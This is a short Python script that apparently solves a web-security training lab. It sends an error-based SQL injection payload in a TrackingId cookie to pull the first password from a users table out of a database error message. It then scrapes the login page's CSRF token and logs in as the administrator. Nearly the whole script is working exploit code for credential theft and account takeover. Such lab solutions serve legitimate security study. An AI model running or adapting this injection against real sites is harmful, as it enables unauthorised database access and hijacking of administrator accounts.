import requests
import re
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
session = requests.Session()
burp_cookies = {"TrackingId": "' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"}
burp_headers = {}
response = session.get(burp_url, headers=burp_headers, cookies=burp_cookies)
match = re.search(r'[a-z0-9]{20}',response.text)
password = match.group(0)
r = session.get(login_url)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', r.text)
csrf_token = csrf_token_match.group(1)
burp0_data = {"csrf": csrf_token, "username": "administrator", "password": password}
session.post(login_url, headers=burp_headers, data=burp0_data)
